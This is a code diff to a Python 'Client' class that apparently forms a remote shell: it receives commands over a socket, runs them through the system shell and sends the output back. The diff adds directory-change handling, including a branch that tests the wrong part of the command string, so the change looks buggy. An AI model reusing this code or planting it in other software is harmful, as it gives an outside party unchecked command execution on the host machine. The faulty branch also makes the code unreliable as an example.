@@ -23,6 +23,10 @@ class Client:
                 command = self.client.recv(1024).decode('utf-8')
                 if command in self.quit_list:
                     break
+                elif command[:3] == 'cd ':
+                    os.chdir(command[3:])
+                elif command[3:] == '..':
+                    os.system(command)
                 else:
                     output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
                     self.client.send(output.encode('utf-8'))
